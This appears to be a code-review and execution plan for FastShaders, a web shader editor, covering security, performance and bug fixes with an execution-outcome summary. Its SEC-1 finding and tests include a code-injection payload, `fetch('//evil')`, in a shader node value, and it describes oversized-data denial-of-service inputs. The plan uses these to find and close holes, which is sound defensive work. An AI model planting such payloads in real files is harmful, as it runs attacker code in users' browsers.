# FastShaders — Review & Execution Plan (2026-08-08)

> ## ✅ EXECUTED 2026-08-08 — see `## 0b. Execution outcome` below.
> This plan was independently RE-VERIFIED (each finding attacked before being
> accepted), every fix was DESIGNED and then ADVERSARIALLY AUDITED, and the
> surviving fixes were APPLIED. Several findings below were REFUTED or DROPPED
> during verification and were deliberately NOT applied — the outcome section
> is authoritative where it disagrees with the body of this document.

Prepared for execution by **Opus 5**. Produced by a 7-agent review (components,
engine/registry, store/hooks/utils, bloat/dead-code, prior-audit reconciliation,
test-suite quality, live headless-Chrome smoke test) at commit `ac6f17e`
(v0.3.15), every headline finding spot-verified against current line numbers.

---

## 0. Baseline health — GREEN

| Check | Result |
|---|---|
| `npm test` | **1401 / 1401 pass**, 87 files, ~1 s |
| `npm run build` (`tsc -b && vite build`) | clean, 4.1 s |
| Live smoke test (Chrome, WebGL2 fallback) | main / node-editor / node-designer / podest all **PASS**; demo shader compiles in ~0.8 s; zero console errors |
| Codebase hygiene | 0 dead deps, 0 dead source files, 0 `console.log`, 0 dead CSS classes |

This is a healthy, well-tested codebase. The findings below are refinements, not
rescues. The single most important cluster is **P0 (adversarial-input safety)** —
`.fastshader` files are shared between users and the XR popup executes generated
modules at the app's real origin, so the injection/DoS gaps there are the only
findings with a real security dimension.

---

## 0b. Execution outcome (2026-08-08)

**Final state:** 97 test files / 1529 tests passing (from 87 / 1401), production
build green, **52 real shaders byte-identical** to the pre-change baseline,
all 4 app pages browser-verified. 61 files changed (+1901/−355), 14 new files.
Nothing committed.

### Applied
| ID | Outcome |
|---|---|
| SEC-1 | Applied at **5** sites (2 more than planned). Verification proved it reachable by PASTING TSL + Apply, not just via a tampered file; a `0x…` payload bypassed the hex guard; a newline in a stored hex escaped the module header in `tslToShaderModule`. 16 tests. |
| SEC-2 | `sanitizeDataNodes` + 3 O(1) decode ceilings (length/columns/rows) at 3 load paths. |
| SEC-3 | `effectiveExposedPorts` type guard + `normalizeExposedPorts` at ingestion. |
| SEC-4 | New `utils/edgeExtras.ts`. **Audit-corrected**: the original sanitizer threw on a null edge, which would have caused the data loss it prevents. |
| PERF-1/2/5/6 | History bracketing. Browser-measured: 36 slider change events → **1** history entry, 1 undo restores the prior value. PERF-2 used the audit's ownership-flag form, not the `moved` gate. |
| PERF-3 | **Audit-corrected.** The original edit froze a waveform that animates today (unwrapped lookup + raw graph walk). |
| PERF-4 / PERF-9 | Applied as designed. |
| PERF-7 | Graph index + the audit's two-map cursor rewrite (the original Piece B was inert). **44× faster at 1200 nodes**, linear growth, 0 byte diffs. |
| BUG-1 | materialSettings leak fixed both directions. The "optional" offset-displacement piece proved REQUIRED for byte-stability. |
| BUG-2/3/4 | `getTargetEdges` (+3 extra sites), control bytes removed from 3 files, multi-arg noise now warns instead of silently rewriting. |
| COST-1 | quest3s 110 → 260. Two of the proposed doc edits were rejected by the audit. |
| COST-2 / BUG-5 / BUG-6 | PARTIAL per audit: cellNoise+perlinVec3 only; `unknown` 0→25; collapse-invariant budget only. |
| CLEAN-1/2/3, DX-1/2/3/4a/c, REFACTOR-1, DOC-1 | Applied. `noUnusedLocals: true` now enforced. DX-1 got the audit's corrected skip list (the original omitted `SELECT`). |

### Refuted / dropped during verification — do NOT revisit without new evidence
`PERF-8` (debounce names the wrong cost) · `PERF-10` (measured trivial) ·
`PERF-11` (deferred; fix trades a known cost for an unproven one) ·
`PERF-12` (byte-guarded for ~ms) · `PERF-13` · `PERF-14` (proposed fix unsound) ·
`PERF-15` (**the "fix" is 14× SLOWER**) · `PERF-16` (**premise false — Babel is not in the main chunk**) ·
`BUG-5` Piece B (0 applicable sites) · `DX-4b` tangentLocal ·
`REFACTOR-1` Babel/nodeFrameSize/lruSet de-dups ·
**"Committed TLS private key" — FALSE ALARM: never committed, already gitignored.**

### Still open (owner's decision)
- 10 MB of `.pptx` tracked at repo root; ~49 MB `node_modules` tracked inside the
  `a-frame-shaderloader` submodule (separate repo + jsdelivr CDN source).
- Behaviour change to note before shipping: re-exporting a graph that came from a
  bare-script import now carries THAT file's material settings (correct; the old
  value was provably wrong).
- `endInteraction` is globally un-owned — all 4 producers balanced today, but the
  store does not enforce pairing.
- WebKit `<select>`+Escape path unverified (Chromium-only browser run).

---

## 1. How to execute this — READ FIRST

**Byte-stability is sacred.** Already-exported shaders reference a frozen loader
from a CDN; `graphToCode.test.ts` / `roundTrip.test.ts` / `noiseRangeCorpus.test.ts`
pin emitted bytes for the built-in textures, presets, and the `Tests/` corpus.
Every change is tagged below as:

- **BYTE-SAFE** — provably cannot change emitted bytes for any graph the app can
  produce. Land freely.
- **BYTE-GUARDED** — changes bytes *only for malformed/adversarial values*; legit
  values must stay byte-identical. Land only with the full corpus + round-trip +
  junk-value sweep green, and byte-diff a real export before/after.

**Guardrail after every batch:** `npm test && npx tsc --noEmit`. For BYTE-GUARDED
work also byte-diff a Download-Shader bundle of a graph with an embedded image and
a built-in preset, before vs after.

**Suggested batching** (each batch is independently shippable):

1. **Security batch** — SEC-1..4 (+ their new tests). Highest value.
2. **History-bracketing batch** — PERF-1, PERF-2, PERF-5, PERF-6. One convention,
   four sites, all BYTE-SAFE.
3. **Hot-path perf batch** — PERF-3, PERF-4, PERF-7, PERF-8, CLEAN-1.
4. **Correctness batch** — BUG-1, BUG-2, BUG-4, BUG-5, COST-1.
5. **Cleanup / DX batch** — everything in P3 + repo hygiene + doc fixes.

---

## P0 — Adversarial-input safety (do first)

### SEC-1 — JS injection via node `values` (three sites) — **BYTE-GUARDED**
**Where:** `src/engine/graphToCode.ts:1166-1169` (generic `defaultValues` branch),
`:1699` (`resolveArguments`), `:1724` (`resolveExposedParam`).
**What:** stored `values` strings are spliced into the emitted module verbatim:
```ts
// :1166  generic type-constructor branch
const formatted = typeof val === 'string' && val.startsWith('#') ? hexLiteral(val) : val;
bodyLines.push(`  const ${varName} = ${def.tslFunction}(${formatted});`);
// :1699  resolveArguments
if (val !== undefined) return String(val);
// :1724  resolveExposedParam (reached by noise pos/scale + texture channel/tiling params)
return String(nodeValues?.[key] ?? 1);
```
A tampered `.fastshader` with e.g. a Float node `values.value = "0); fetch('//evil')//"`
emits `const float1 = float(0); fetch('//evil')//);` at module scope. Payload
travels via `FASTSHADERS_PROJECT_V1` / `fs:graph` / `fs:savedGroups`, and the XR
popup runs the module **at the app's real origin**.
**Why it matters:** only finding with code-execution reach. The safe pattern already
exists in the same file — `numericParam` (`:123-138`), whose doc comment explicitly
names `resolveExposedParam`'s `String()` as the thing to avoid, and `hexLiteral`
(`:159-161`) already guards color paths.
**Fix:**
- `:1699` and the `:1166` branch: `const n = Number(val); if (Number.isFinite(n)) return num(n);` else fall through to registry default → `chainIdentity` → `'0'` (mirror `numericParam`); keep the `#`→`hexLiteral` path for color defaults.
- `:1724` `resolveExposedParam`: rewrite over `numericParam` with per-key registry-default fallbacks, **except** the noise `pos` key, which legitimately stores identifier strings (`'positionGeometry'`, see `codeToGraph.ts:1072`). Whitelist `pos` with `/^[A-Za-z_][A-Za-z0-9_]*$/` + membership in a known-TSL-inputs set, else fall back to `'positionGeometry'`.
**Risk:** BYTE-GUARDED. Confirm `num(2)` prints `2` (no decorated suffix) so
`num(Number(val))` equals today's `String(val)` for integers. Legit numeric/hex
values must byte-diff clean; only garbage values change (they become the inert
fallback — the goal).
**Verify:** extend the `graphToCode.test.ts` junk-value sweep with
`values.value = "1); evil()//"` at all three sites, asserting inert numeric
emission; byte-compare every built-in texture/preset + `Tests/` corpus.

### SEC-2 — Missing `sanitizeDataNodes` + uncapped `decodeDataNode` — **BYTE-SAFE**
**Where:** `src/utils/dataNode.ts:92-99` (no size cap before `base64ToFloat32`);
load paths that only sanitize images/drawings: `useAppStore.ts:530-537` (`loadGraph`),
`:78-86` (`loadSavedGroups`), `projectImport.ts:68-94` (`applyProjectToStore`).
Confirmed: `grep -rn sanitizeDataNodes src/` → **none**.
**What:** a Data node's `values.dataB64` has no cap on any load path. A crafted
`.fastshader` can carry a 100 MB+ base64 blob that enters the store verbatim, rides
~51 `structuredClone` history copies, is `JSON.stringify`'d into every 300 ms
autosave (→ quota exhaustion, autosave dies), re-embeds into every export, and gets
`atob`-decoded on every `graphToCode` pass once wired. `makeDataNodeData` caps at
*creation* (`capToWidth` → 8192 rows), so no legit file needs more than
`columnCount × 8192 × 4` bytes.
**Fix:** add `sanitizeDataNodes(nodes)` in `dataNode.ts` mirroring `sanitizeImageNodes`
(key whitelist `dataB64`/`rowCount`/`columnCount`/`columnNames` + display keys; drop
`dataB64` when `length` exceeds `columnCount × MAX_TEXTURE_WIDTH × 4 × 4/3` plus an
absolute hard cap; bound `rowCount ≤ 8192`, `columnCount ≤ 16`). Also reject in
`decodeDataNode` when `dataB64.length > ~700_000` (construction bound is
16×8192×4 → 699,052 chars). Call it beside `sanitizeImageNodes` at the three sites.
**Risk:** BYTE-SAFE for app-produced graphs (emitter already `capToWidth`s). A
pre-cap legacy graph would have its stored payload truncated on next save — emitted
code stays identical. Set the ceiling ≥ the legit worst case.
**Verify:** new `src/utils/dataNode.test.ts` — max-legit payload accepted, oversize
degrades to null; import a hand-edited 50 MB `dataB64` → node inert, store bounded.

### SEC-3 — `exposedPorts` type confusion → empty canvas on boot — **BYTE-SAFE**
**Where:** `src/utils/exposedPorts.ts:43-46` (`effectiveExposedPorts` returns `raw`
with no `Array.isArray` check), consumed by `autoExposeConnectedParamPorts:64`
(`current.includes(...)`). Throw sites: `useAppStore.ts:528` (inside `loadGraph`'s
try → whole load returns null) and `projectImport.ts:68` (after `pushHistory` + pref
writes → partial apply).
Confirmed: the guard is absent — `if (raw !== undefined) return raw;`.
**What:** a tampered `exposedPorts: 5` (number/object) makes `.includes` throw;
`loadGraph`'s catch returns null and the user boots to an **empty canvas** while the
graph is still in localStorage (reads as total data loss). On import the throw
escapes mid-apply, exactly the partial-apply failure `extractProjectState`'s
element-shape gate exists to prevent — this field just isn't covered.
**Fix (one line):**
```ts
return Array.isArray(raw)
  ? raw.filter((s): s is string => typeof s === 'string')
  : (node.data.registryType === 'output' ? OUTPUT_DEFAULT_EXPOSED : []);
```
**Risk:** none — valid arrays pass through unchanged; exposure gating becomes
strictly better-typed (BYTE-SAFE).
**Verify:** extend `exposedPorts.test.ts` — node with `exposedPorts: 5` + a connected
edge must not throw; `loadGraph` round-trip with the tampered field returns the graph.

### SEC-4 — Edge `data`/waypoints imported with zero validation — **BYTE-SAFE**
**Where:** `projectImport.ts:88-94` (`edges: project.graph.edges` verbatim);
`exportShader.ts:60` (edges embedded verbatim); reader `TypedEdge.tsx:261`
(`data?.waypoints ?? []`, no count/finiteness bound). `loadGraph` doesn't touch
`edge.data` either.
**What:** `edge.data` is the one graph payload with no adversarial validation. A
crafted file can put 10⁶ junk waypoints (or `{x:"1e999"}` → NaN spline `d`) on an
edge → Catmull-Rom construction per render at pointer rate, or invisible edges. Same
hole via tampered `fs:graph`. Also a **doc/behavior drift**: CLAUDE.md says waypoints
do *not* survive a `.js`/zip import, but they round-trip through project blocks today
(only bare-script imports lose them).
**Fix:** add `sanitizeEdgeExtras(edges)` (cap waypoints/edge at e.g. 64, coerce to
finite numbers, drop unknown/oversized `data` keys); call it in `loadGraph` and
`applyProjectToStore`. Then reconcile CLAUDE.md — either document that waypoints
round-trip, or strip `data.waypoints` in `buildProjectState`.
**Risk:** visual-only (graphToCode/cpuEvaluator never read waypoints) → BYTE-SAFE.
**Verify:** import a `.js` whose block carries `data.waypoints` (they render today);
add a sanitizer test.

---

## P1 — High-value perf & correctness

### PERF-1 — Slider + inline color rows are UNBRACKETED (history flood) — **BYTE-SAFE**
**Where:** `ShaderNode.tsx:795-806` (`slider` range `<input>`) and `:817-826`
(inline `type="color"`, used by `stripes`/`dataviz` `lowColor`/`highColor`) →
`handleChange` (`:497-504`) → `updateNodeData` → **unconditional** `get().pushHistory()`
(`useAppStore.ts:1028-1029`, spot-verified).
**What:** a range/color drag fires `onChange` per frame; each one does a full-graph
`structuredClone` + one history entry. `MAX_HISTORY` is 50, so a ~1 s slider scrub
**evicts the user's entire undo history**, and Cmd+Z afterwards steps through
sub-pixel slider values. This is precisely the "Continuous gestures must be
bracketed" rule; every comparable widget (DragNumberInput, ColorNode, settings-menu
color/name) already brackets — these two on-card paths are the only copies that don't.
**Fix:** route both through `useHistoryBracket` — `bracket()` in `onChange`,
`closeBracket` on the input's native `change`/blur — mirroring `ColorNode.tsx:135-154`.
**Risk:** history granularity only (BYTE-SAFE). Ensure the bracket closes on
pointercancel/unmount.
**Verify:** store test — 20 `updateNodeData` calls with changing `values.value`;
assert `past.length === 1` with the bracket (20 today). Manual: scrub a Slider once,
Cmd+Z repeatedly.

### PERF-2 — DragNumberInput unpaired `endInteraction` — **BYTE-SAFE**
*(Found independently by two agents: COMP-5 + STORE-5.)*
**Where:** `DragNumberInput.tsx:105-118` (onPointerUp), `:123-129` (onPointerCancel),
`:132-137` (unmount). `beginInteraction` runs only on first *move* (`:92`) but all
three teardowns call `endInteraction()` unconditionally.
**What:** a click-to-edit (no move) fires an **unpaired end** that steals a depth from
any bracket already open. Repro without multi-touch: drag a settings-menu color swatch
(useHistoryBracket, 600 ms idle window), then click any DragNumberInput within that
window — the click's pointerup closes the color bracket early, `bracket()` sees its
own `openedRef` still true and never re-opens, so every subsequent picker frame pushes
a full-graph history entry (the exact flood brackets prevent).
**Fix:** gate all three closes on `dragRef.current.moved` (the condition under which
`beginInteraction` actually ran); read `moved` before onPointerCancel zeroes it.
**Risk:** none (BYTE-SAFE); keep the cancel/unmount closes for real drags.
**Verify:** store test — foreign `beginInteraction()` (depth 1) → simulate press+release
with no move → assert `coalescingHistory` still true (false today).

### PERF-3 — MathPreviewNode whole-array store subscriptions — **BYTE-SAFE**
**Where:** `MathPreviewNode.tsx:32-33` (`s.nodes`, `s.edges`), plus `:55-58`, `:64-67`.
**What:** the exact anti-pattern PreviewNode/ShaderNode were converted away from.
Every `sin`/`cos` node on the canvas re-renders on every store notify (60/s during a
drag), each paying an O(E) `edges.find` + an uncached `hasTimeUpstream` BFS; the
`memo()` on `:23` is dead weight because the subscription bypasses it.
**Fix:** apply PreviewNode's documented conversion (`PreviewNode.tsx:108-141`) — one
primitive string-key selector folding `xSource` + `hasTimeUpstream` (+ static-branch
`evaluateNodeScalar`), rebuild via `useAppStore.getState()` in a `useMemo`, and read
`getState()` per frame in the rAF draw loop; delete the `nodesRef`/`edgesRef` mirror.
**Risk:** render-layer only (BYTE-SAFE). Keep a dep that changes on upstream-value
change (the folded key covers it) or the waveform freezes on upstream edits.
**Verify:** `console.count` at the top of the component; place one `sin`, drag an
unrelated node — before: one render/frame; after: zero.

### PERF-4 — CodeEditor rebuilds the export module per drag frame — **BYTE-SAFE**
*(COMP-2 + reconcile perf-medium.)*
**Where:** `CodeEditor.tsx:39` (`s.nodes` whole-array sub), `:98-105` (`scriptCode`
memo with `nodes` in deps).
**What:** with the Output tab open, every drag pointermove re-runs
`inlineImageAssetsFromNodes` (expands `fs-asset:` placeholders back to up-to-600K-char
data URLs) + `tslToShaderModule` — megabytes of string work at pointer rate with
embedded images.
**Fix:** drop `nodes` from the memo deps and read `useAppStore.getState().nodes` at
memo time — the module depends on nodes only through image payloads, and every payload
change already changes `code` (placeholder embeds a payload hash). Key on
`[code, activeTab, materialSettings, propertiesKey]`. Also switch `materialSettings`
and `properties` to the narrow/cheap-key selectors (`ShaderPreview.tsx:264-267`,
`ShaderNode.tsx:291-332` patterns).
**Risk:** display surface only — export path (`buildShaderBundle`) reads the store
imperatively (BYTE-SAFE). Keep `propertiesKey` complete (both `property_float` and
`property_color`).
**Verify:** open Output tab, drag a node, profile (no `tslToShaderModule` frames after);
confirm editing a property default still updates the shown module.

### BUG-1 — materialSettings leak onto imported plain `.js` — **BYTE-SAFE**
*(CLAUDE.md's own flagged "Known follow-up"; reconcile confirms both directions.)*
**Where:** `useSyncEngine.ts:200-204` (unconditional carry of the *previous* graph's
settings) + `scriptToTSL.ts:37-38, 274-275` (strips the *incoming* file's own
settings). Wrong in both directions.
**Fix:** make `scriptToTSL` **return** the stripped `materialSettings` (sanitized —
`alphaTest` coerced+clamped ≤0.99, booleans coerced); `projectImport` applies them to
the store + output node *before* the sync pass; change `mergeMatch` to keep old
settings only when the new node carries none:
`if (oldMatSettings && !(merged.data as any).materialSettings)`.
**Risk:** imported scripts start rendering with their authored transparency/side (the
fix); no graph-emission bytes change (settings ride `tslToShaderModule`, exports
already carried them). BYTE-SAFE for graph codegen.
**Verify:** export A (transparent) → import plain opaque B → preview opaque + Shader
Settings shows defaults; add a `scriptToTSL` settings-extraction test.

### BUG-2 — MicNode/ClockNode collapsed-group label degradation — **BYTE-SAFE**
**Where:** `MicNode.tsx:73-92` (`edgeKey` selector + `wiredLabels`) and
`ClockNode.tsx:66-79` (`speedEdgeKey` + `wiredSpeed`) iterate **raw** `s.edges`.
**What:** while a feeder sits in a collapsed group, the raw edge's `source` is the
group id, which has no registry def, so `edgeValueLabel` degrades to grey `…` instead
of the arriving number. OutputNode/ShaderNode/PreviewNode already use `getTargetEdges`
for exactly this.
**Fix:** replace the raw scans with `getTargetEdges(s.nodes, s.edges, id)` (filter
ClockNode's to `targetHandle === 'speed'`); import from `@/engine/cpuEvaluator`.
**Risk:** labels are render-only (BYTE-SAFE); also O(1) indexed vs O(E)/notify.
**Verify:** wire a Float into a Mic `gain`, group + collapse the feeder — chip shows
the number, not `…`.

---

## P2 — Worthwhile

### PERF-5 — ShaderSettingsMenu alphaTest slider + NumberRow unbracketed — **BYTE-SAFE**
`ShaderSettingsMenu.tsx:235-245` (alphaTest range → `updateSettings` per frame);
`menuShared.tsx:67-90` (`NumberRow` commits per keystroke → typing "0.125" = 4 history
entries + 4 clones + 4 graphToCode passes; used by Stripes/DataViz/Colormap/DataRange).
**Fix:** `useHistoryBracket` in both (bracket on onChange, close on blur).

### PERF-6 — exposedPort toggle pushes 2–3 history entries per click — **BYTE-SAFE**
`exposedPorts.ts:78-91` (`toggleExposedPort` → `removeEdgesForPort` pushes) composed
with `updateNodeData` (pushes again). Hiding a wired port = 2 entries (undo #1 lands on
socket-exposed-but-wire-deleted); `handleTransparentChange(false)` with wired opacity =
3. Sites: `NodeSettingsMenu.tsx:64-66`, `ShaderSettingsMenu.tsx:59-111`.
**Fix:** make the composition atomic — a `{skipHistory}` mode on `toggleExposedPort` (or
split compute from commit) with one `pushHistory` per gesture, or wrap each handler in
`beginInteraction`/`endInteraction`. Keep `removeEdgesForPort`'s standalone one-entry
behavior (its existing test).

### PERF-7 — graphToCode O(N·E) edge/node lookups — **BYTE-SAFE**
`graphToCode.ts` — `resolveEdgeRef:1622`, `resolveArguments:1686`,
`resolveExposedParam:1717`, and the output-channel loop all do fresh linear
`.find`s per resolution. Measured: 0.38 ms @ 101 nodes → **4.33 ms @ 601** (super-linear).
**Fix:** after `topologicalSort`, build `nodeById = new Map(sorted.map(n=>[n.id,n]))`
and an incoming-edge index `Map<targetId, AppEdge[]>` (push order preserved → first-match
identical); thread both through the helpers. cpuEvaluator's `EvalCtx` already does this.
**Risk:** BYTE-SAFE (same first-match, same iteration order). Guardrail: the byte-identical
suites.

### PERF-8 — SplitPane / DrawToolbar synchronous localStorage per frame — **BYTE-SAFE**
`SplitPane.tsx:153-165` writes `fs:splitRatio` + `fs:previewSplitRatio` (two setItems)
per pointermove; `DrawToolbar.tsx:52-77` writes per input event. Main-thread I/O stacked
on live-resize render.
**Fix:** debounce the setItem in `setSplitRatio`/`setRightSplitRatio`/`setDraw*` (300 ms
per key, store set stays immediate), or persist on pointerup. The fs:graph autosave and
fs:assetBarHeight already model this.

### BUG-3 — Raw control bytes make two source files "binary" — **BYTE-SAFE (runtime-identical)**
**Where:** `MicNode.tsx` and `OutputNode.tsx` each contain **2 raw NUL (0x00) + 1 SOH
(0x01)** inside a template literal (`${targetHandle}\x00${l.text}\x00...`) — Python-verified.
ShaderNode uses the escaped ` `/`` and is clean.
**What:** grep/ripgrep/BSD-grep classify both files as **binary and silently skip them**
(demonstrated live: `mic-node__wired` / `output-node--selected` returned false negatives).
Any repo-wide grep/sed audit misses these files, invisibly.
**Fix:** replace the raw bytes with ` `/`` (byte-identical JS string). Optionally
align ClockNode's space-separated key to the same separators.
**Verify:** `python3 -c "print(open('src/components/NodeEditor/nodes/MicNode.tsx','rb').read().count(0))"` → 0; `git grep mic-node__wired` then lists the file.

### BUG-4 — Extra noise args silently dropped — **BYTE-SAFE (warning only)**
`codeToGraph.ts:1048-1075` reads only `args[0]`, so `mx_fractal_noise_float(p, 8)`
round-trips to 3-octave code with `errors: []` — a silent shader rewrite.
**Fix:** `if (args.length > 1)` push a `severity:'warning'` ParseError ("extra noise
arguments dropped — octaves/amplitude not supported"), or route multi-arg calls to the
unknown-node path to preserve `rawExpression`. Warning-only = zero byte change.

### BUG-5 — Unknown-node hole: cost 0 + severed upstream — **BYTE-GUARDED (round-trip shape)**
`complexity.json` `unknown: 0` AND `codeToGraph.ts:694-712` creates the unknown node
and `return`s without walking its argument edges — adversarial/aliased pasted TSL reads
as free with a severed upstream subtree.
**Fix:** (a) `unknown ≈ 25` + a name-prefix heuristic in `nodeCost.getCost`; (b) resolve
Identifier args via `varToNodeId` and `addEdge` them to synthetic `argN` handles on the
unknown def. graphToCode keeps emitting `rawExpression` verbatim → emitted bytes
unchanged, but round-trip graph *shape* gains edges/handles → update `roundTrip`/`parseCorpus`
pins deliberately.

### COST-1 — quest3s budget on the wrong chip — **BYTE-SAFE**
`useAppStore.ts:557` `quest3s: maxPoints 110` (quest3 = 200). Quest 3S uses the same
XR2 Gen 2 as Quest 3 with lower-res panels → ~255 (200 × 9.11M/7.03M pixel ratio), not
110. `GPU_COST_ANALYSIS.md:31,220-221` still mis-lists 3S (and Pico 4) on Adreno 660.
**Fix:** `quest3s` → ~255; correct the doc chip rows (3S = Adreno 740, Pico 4 = Adreno
650). Verify with `costProfiles` tests. (Verified: current value is 110.)

### CLEAN-1 — Dead store subscriptions on the hottest component — **BYTE-SAFE**
`NodeEditor.tsx:601,602,605` — `costColorLow`, `costColorHigh`, `isDarkTheme` are live
`useAppStore` subscriptions whose values are **never read** (`tsc --noUnusedLocals`
confirmed), so NodeEditor re-renders on every theme/cost-color change for nothing.
Plus dead imports `MiniMap` (`:5`) and `getCostColor` (`:78`).
**Fix:** delete the three subscriptions + two imports.

### DX-1 — Escape doesn't close the AddNodeMenu
`AddNodeMenu.tsx` onKeyDown handles Arrow/Home/End/Enter but has **no Escape handler**
(smoke-test confirmed; outside-click does close it). Add an Escape → close.

### DX-2 — `<button>` inside `<button>` on the node-editor overview
`GraphsPage.tsx:149` renders a row `<button>` → NodePreviewCard → NodeVisual →
DragNumberInput's `<button>` (React `validateDOMNesting` warning; invalid HTML). Make the
row a non-button clickable (div with role/keydown) or render the card's interactive bits
inert on that page.

---

## P3 — Minor / hygiene (BYTE-SAFE unless noted)

- **COST-2** — complexity.json stragglers vs the doc's own table: `mod 2→6`, `remap 5→7`,
  `smoothstep 7→10`, `uv 2→0`, `cellNoise 12→~3` (verified current values). One data pass
  cross-checked against `benchData/quest3-20260723`. Badges are creation-time snapshots, so
  only new nodes reprice; asset-browser sort shifts.
- **PERF-9** — builtin-textures tab-gate: `ContentBrowser.tsx:530-539` calls
  `getBuiltinTextures()` at mount unconditionally; presets got the `activeCategory` gate,
  textures didn't. Mirror it (keep the `q` search path).
- **PERF-10** — preset/texture thumbnail module cache: `TextureCard`/`PresetCard` re-shade
  per mount; add a module-level `Map<assetId, ImageData>` and blit on hit.
- **PERF-11** — history snapshot shares `imageB64` by value: `useAppStore.ts:374-375`
  `structuredClone`s nodes/edges (again on undo `:1249`). Shallow-copy nodes + share `data`
  by reference (drawings already do this); audit that no path mutates `data` in place.
- **PERF-12** — invert image-inline vs module-build: build from placeholder code, run
  `inlineImageAssetsFromNodes` once on the final string, at all four surfaces. BYTE-GUARDED
  (placeholder line must not be reordered — pin with a test).
- **PERF-13** — `usePersistedState.ts:39-46` writes localStorage synchronously on every
  change; add a ~200 ms trailing debounce + `pagehide` flush, and cancel a pending write
  when `fs:project-imported` seeds a new value (the import-clobber hazard is the real risk).
- **PERF-14** — `useFitText.ts:29,56-58` shrinks by 0.5 px steps with a layout read per
  iteration; jump to `maxPx × available/scrollWidth` then ≤3 corrective steps.
- **PERF-15** — `imageAssets.ts:133-135` memo keyed on the full multi-MB payload; key on
  `${w}x${h}|${raw.length}|${hash(raw)}` (hash once).
- **PERF-16** — Babel (~500 KB) rides the main chunk; add
  `if (id.includes('node_modules/@babel/')) return 'babel'` to `vite.config.ts`
  manualChunks (split, not lazy — used at ContentBrowser mount). Watch the documented
  preload-helper hoisting trap.
- **CLEAN-2** — dead exports/locals (`tsc --noUnusedLocals`-verified): `costOverride.ts:88`
  `emptyMeta`; `nodeCost.ts:61-65` `getActiveCosts`/`getBaseCosts`/`getCostOverrides`;
  `micSession.ts:75-77` `isMicCapturing`; `imageImport.ts:290` `__setEncodeCapsForTest`
  (no test uses it); `graphToCode.ts:36` `hexToRgb01` import; `codeToGraph.ts:1015` unused
  `def` param of `processNoiseCall`; plus the small locals list. Consider flipping
  `noUnusedLocals: true` (currently `false` in both tsconfigs) to keep this class extinct.
- **CLEAN-3** — latent rules-of-hooks: `ShaderNode`/`PreviewNode`/`MathPreviewNode`/
  `ClockNode`/`MicNode` all call hooks after `if (!def) return null`. Safe today
  (registryType is immutable per mounted id) but eslint-error and a future dynamic-registry
  landmine. Move the early return below the last hook, or add a scoped eslint-disable +
  invariant comment.
- **REFACTOR-1** — de-dup: `safeJsonReviver` (identical in `useAppStore.ts:67` and
  `fastShadersProject.ts:46` — a security control maintained twice) → `src/utils/safeJson.ts`;
  the Babel CJS/ESM interop unwrap (3 copies: codeToGraph/scriptToTSL/descriptionSplice) →
  `getBabelTraverse()`; optional `nodeFrameSize` helper (`useAppStore.ts:1516` vs `:1681`
  encode the same precedence with different fallbacks); optional `lruSet` helper (4 copies).
- **BUG-6** — group cost badge stale: `useAppStore.ts:1929-1932,:2059` writes `data.cost`
  at collapse (snapshot, no reachability filter, stale for old saves). Derive the pill in
  `GroupNode` via a selector (`nodeCostPoints` over unwrapped members); stop writing `data.cost`.
- **DX-3** — Discard truthiness tooltip: `nodeRegistry.ts:985` has no description; add
  "Culls the pixel when non-zero — 0.2 discards; use Compare nodes for a clean threshold"
  (+ LV). Prevents exactly the misunderstanding that consumed the 2026-08-07 audit day.
- **DX-4** — three small correctness/labeling items: `tangentLocal` (`nodeRegistry.ts:135`)
  emits `vec3(0,0,0)` on every preview geometry (no `computeTangents`) — either call it in
  `fit-bounds` when index+uv+normal exist (both twins + `previewFitBounds.test`) or hide the
  node; `Crumpled Fabric` tile icon (`TextureCard.tsx:86-107`) renders a normal-map viz but
  the texture outputs a color blend — redraw the icon; `View Dir (world)` label
  (`nodeRegistry.ts:50`) is misleading (it's object-origin→surface direction) — rename +
  LV + `Also:` search tail.
- **DOC-1** — stale CLAUDE.md notes to fix while nearby: dark-canvas default is `#41454d`
  (`useAppStore.ts:347`), not `#1e1f22`; saved-groups `persistSavedGroups` is *synchronous*,
  not "debounced 300ms"; waypoints DO round-trip through project blocks (see SEC-4); the
  Testing paragraph under-lists ~20 existing suites.

---

## Test additions (land with their fixes where noted)

Suite quality is clean (no stub drift, no dead/tautological tests). The gaps are on
**adversarial-input surfaces with zero coverage**:

- **TEST-1 (P1)** `fastShadersProject.test.ts` — the shared-file parser: `*/`→`*/`
  escape round-trip, `__proto__` reviver, `version:2`/`nodes:null`/missing-`data`/missing-END
  → null, stripped-text reconstruction (top vs bottom block).
- **TEST-2 (P1)** `projectImportPrefs.test.ts` — uniform-value clearing (block with vs
  without `uniformValues`), theme-before-canvas-color ordering, both `fs:project-imported`
  + `fs:graph-imported` fired (model-only zip fires only the former), over-cap image →
  sanitized + notice. (Also: decide if `projectImport.ts:96`'s ungated `window.dispatchEvent`
  should get the `typeof window` guard `:109` has.)
- **TEST-3 (P1)** `exportShader.test.ts` — pins the "ONE bundle builder" byte-identity
  (`buildShaderBundle()` twice → identical); full export→import loop; `collectShaderProperties`.
- **TEST-4 (P1)** `loadGraphMigrations.test.ts` — micNode type re-derive, tslTex drop + edge
  prune, noise→preview, `extent:'parent'` strip, `__proto__` reviver, non-array → null.
- **New sanitizer tests** ship with SEC-2 (`dataNode.test.ts`), SEC-3 (`exposedPorts.test.ts`
  extension), SEC-4 (edge-extras).
- **vitest config** (`vite.config.ts` test block): add `unstubGlobals: true` +
  `restoreMocks: true` (automates the manual stub-cleanup the `isolate:false` comment relies
  on; compatible with all current beforeEach stubs). Note `include` misses `.test.tsx`
  (zero today) — keep the pure-logic convention explicit or widen the glob.
- **Refactor-enabled** (do during PERF/BUG work): extract `mergeMatch` from `useSyncEngine`
  into a pure module so the reconciliation rules + the BUG-1 fix become node-testable.

---

## Repo hygiene / bloat (outside `src/` — mostly weight, not code)

- **10.0 MB** — `FastShaders_XRSalento2026.pptx` + `_02.pptx` tracked at repo root
  (verified: 2 files in `git ls-files '*.pptx'`), referenced by nothing. `git rm --cached`
  + gitignore (keep local copies; the gitignore already excludes the paper siblings).
- **~48.7 MB** — `node_modules/` committed **inside the `a-frame-shaderloader` submodule**
  (verified: 3007 tracked `node_modules` paths). Gitignore it there + commit a lockfile
  (`build/build.mjs` can `npm ci`). MEDIUM risk — confirm the jsdelivr CDN serves only `js/`
  and that `node build/build.mjs` reproduces the bundle byte-identically (`vendorSync.test.ts`).
- **TLS private key committed** — `ShaderCarousel/https/localhost.pem` + `localhost2.key`
  (agent-reported; the dist plugin already excludes the dir). `git rm` + gitignore; regenerate
  locally with mkcert when needed.
